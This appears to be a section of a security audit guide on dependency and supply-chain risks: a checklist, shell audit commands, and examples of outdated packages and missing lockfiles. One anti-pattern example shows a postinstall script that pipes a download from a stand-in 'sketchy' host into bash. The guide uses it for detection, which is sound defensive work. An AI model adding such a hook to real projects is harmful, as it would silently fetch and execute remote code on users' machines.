## Phase 8: Dependencies & Supply Chain

**Objective:** Find vulnerable, outdated, or suspicious packages.

### Checklist

1. Run package audit tool (`npm audit`, `pip-audit`, etc.)
2. Check for packages with known critical CVEs
3. Look for packages multiple major versions behind
4. Check for deprecated or abandoned packages
5. Look for typosquatting (suspicious package names similar to popular ones)
6. Verify lockfile is committed (reproducible builds)
7. Check for overpowered SDK permissions (e.g., full AWS admin in a web handler)
8. Look for postinstall scripts that download or execute code

### Where to Look

```bash
# Package manifests
cat package.json requirements.txt Gemfile pom.xml go.mod Cargo.toml 2>/dev/null

# Run audit
npm audit 2>/dev/null
pip-audit 2>/dev/null

# Check lockfile presence
ls -la package-lock.json yarn.lock pnpm-lock.yaml poetry.lock Gemfile.lock 2>/dev/null

# Check for postinstall scripts
grep -A2 "postinstall\|preinstall" package.json

# Check for overpowered SDKs
grep -r "aws-sdk\|@aws-sdk\|firebase-admin\|googleapis" --include="package.json"
```

### Anti-Patterns

```json
// HIGH: Ancient dependencies with known CVEs
{
  "dependencies": {
    "express": "3.0.0",        // From 2012!
    "lodash": "4.17.4",        // Known prototype pollution
    "jsonwebtoken": "8.0.0",   // Multiple CVEs
    "next": "12.0.0"           // Multiple security patches since
  }
}

// MEDIUM: No lockfile committed
// .gitignore includes package-lock.json â€” builds are not reproducible

// MEDIUM: Suspicious postinstall script
{
  "scripts": {
    "postinstall": "curl https://sketchy-domain.com/setup.sh | bash"
  }
}
```

### Proper Patterns

```json
// GOOD: Current dependencies, lockfile committed
{
  "dependencies": {
    "next": "^15.0.0",
    "react": "^19.0.0",
    "better-auth": "^1.0.0"
  }
}

// GOOD: Regular audit in CI
// .github/workflows/security.yml
// - run: npm audit --audit-level=high
// - run: npm audit --audit-level=critical --production
```

### Quick Fixes

- Run `npm audit fix` to auto-fix compatible updates
- Run `npm audit` and address all critical/high findings
- Commit lockfile to ensure reproducible builds
- Set up automated dependency updates (Dependabot, Renovate)
- Add `npm audit` to CI pipeline
- Review and remove unused dependencies
